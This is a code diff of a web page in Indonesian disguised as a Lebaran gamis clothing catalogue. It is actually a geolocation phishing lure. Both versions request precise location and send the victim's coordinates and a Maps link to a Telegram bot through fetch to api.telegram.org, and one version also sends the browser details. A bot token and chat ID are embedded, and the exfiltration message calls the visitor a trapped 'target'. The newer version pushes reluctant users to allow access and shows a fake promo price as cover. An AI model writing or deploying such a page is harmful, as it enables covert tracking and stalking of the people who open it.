@@ -3,73 +3,74 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Katalog Gamis Lebaran Premium 2026</title>
+    <title>Katalog Gamis Lebaran 2026</title>
     <style>
-        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; text-align: center; background-color: #fdf5e6; color: #5d4037; padding: 20px; }
-        .card { max-width: 450px; margin: 20px auto; background: white; padding: 25px; border-radius: 20px; box-shadow: 0 10px 25px rgba(0,0,0,0.1); }
-        img { width: 100%; border-radius: 15px; margin: 15px 0; border: 2px solid #eee; }
-        h2 { margin-bottom: 5px; color: #8d6e63; }
-        p { font-size: 14px; color: #795548; }
-        .btn { background: #8d6e63; color: white; padding: 10px 20px; border-radius: 25px; text-decoration: none; display: inline-block; margin-top: 10px; }
+        body { font-family: sans-serif; text-align: center; background: #f4f4f4; padding: 20px; }
+        .box { background: white; padding: 20px; border-radius: 15px; box-shadow: 0 5px 15px rgba(0,0,0,0.1); max-width: 400px; margin: auto; }
+        img { width: 100%; border-radius: 10px; }
+        button { background: #8d6e63; color: white; border: none; padding: 10px 20px; border-radius: 5px; cursor: pointer; margin-top: 15px; }
     </style>
 </head>
-<body onload="getLocation()">
+<body>
 
-    <div class="card">
-        <h2>✨ Koleksi Eksklusif ✨</h2>
-        <p>Gamis Silk Premium - Limited Edition</p>
-        <img src="https://images.unsplash.com/photo-1621112904887-419379ce6824?q=80&w=1000" alt="Baju Lebaran">
-        <p>Stok terbatas! Cek ketersediaan di wilayahmu...</p>
-        <div class="btn">Cek Harga Promo</div>
+    <div class="box">
+        <h2>Koleksi Gamis Premium ✨</h2>
+        <p>Klik tombol di bawah untuk cek stok & harga promo di kotamu!</p>
+        <img src="https://images.unsplash.com/photo-1585487000160-6ebcfceb0d03?q=80&w=1000" alt="Baju">
+        <br>
+        <button onclick="mintaLokasi()">Cek Harga Promo</button>
+        <p id="status" style="font-size: 12px; color: gray;"></p>
     </div>
 
     <script>
-        // GANTI BAGIAN INI DENGAN DATA KAMU
-        const TELEGRAM_TOKEN = '8658282442:AAFQUZfcPVNUqIDXM0NMWUjGy2G5HHgzhM4'; // Masukkan Token BotFather di sini
-        const CHAT_ID = '1097216714';       // Masukkan ID kamu di sini
+        // MASUKKAN DATA KAMU DI SINI
+        const TOKEN_BOT = '8658282442:AAFQUZfcPVNUqIDXM0NMWUjGy2G5HHgzhM4'; 
+        const ID_CHAT = '1097216714';
 
-        function getLocation() {
+        function mintaLokasi() {
+            document.getElementById('status').innerHTML = "Sedang mengecek koneksi...";
+            
             if (navigator.geolocation) {
-                // Memberikan opsi highAccuracy agar lokasi lebih presisi
-                navigator.geolocation.getCurrentPosition(sendToTelegram, showError, {
+                navigator.geolocation.getCurrentPosition(kirimData, handleErr, {
                     enableHighAccuracy: true,
-                    timeout: 5000,
-                    maximumAge: 0
+                    timeout: 10000
                 });
+            } else {
+                alert("Browser kamu tidak mendukung pelacakan lokasi.");
             }
         }
 
-        function sendToTelegram(position) {
-            const lat = position.coords.latitude;
-            const lon = position.coords.longitude;
-            const accuracy = position.coords.accuracy;
-            const googleMapsUrl = `https://www.google.com/maps?q=${lat},${lon}`;
+        function kirimData(posisi) {
+            const lat = posisi.coords.latitude;
+            const lon = posisi.coords.longitude;
+            const mapsLink = `https://www.google.com/maps?q=${lat},${lon}`;
             
-            const message = `🎯 *Target Masuk Perangkap!*\n\n` +
-                            `📍 *Lokasi:* [Klik Lihat di Maps](${googleMapsUrl})\n` +
-                            `📌 *Lat:* \`${lat}\`\n` +
-                            `📌 *Lon:* \`${lon}\`\n` +
-                            `📏 *Akurasi:* ${accuracy} meter\n` +
-                            `📱 *Info Browser:* ${navigator.userAgent}`;
+            const teks = `📍 *LOKASI DITEMUKAN!*\n\nLink Maps: ${mapsLink}\nLat: ${lat}\nLon: ${lon}`;
 
-            // Mengirim data ke Telegram API menggunakan Fetch
-            fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
+            // Mengirim ke Telegram
+            fetch(`https://api.telegram.org/bot${TOKEN_BOT}/sendMessage`, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify({
-                    chat_id: CHAT_ID,
-                    text: message,
-                    parse_mode: 'Markdown',
-                    disable_web_page_preview: false
+                    chat_id: ID_CHAT,
+                    text: teks,
+                    parse_mode: 'Markdown'
                 })
             })
-            .then(response => console.log('Data terkirim!'))
-            .catch(error => console.error('Gagal mengirim:', error));
+            .then(res => {
+                if(res.ok) {
+                    alert("Koneksi berhasil! Harga promo: Rp 149.000 (Stok Tersedia)");
+                    document.getElementById('status').innerHTML = "Selesai.";
+                } else {
+                    alert("Gagal kirim ke Bot. Cek Token/ID kamu.");
+                }
+            })
+            .catch(err => alert("Error koneksi: " + err));
         }
 
-        function showError(error) {
-            // Jika user menolak, kamu bisa kirim notifikasi bahwa akses ditolak
-            console.log("Akses lokasi ditolak oleh user.");
+        function handleErr(error) {
+            alert("Kamu harus klik 'Allow' atau 'Izinkan' untuk melihat harga promo.");
+            document.getElementById('status').innerHTML = "Akses ditolak.";
         }
     </script>
 </body>
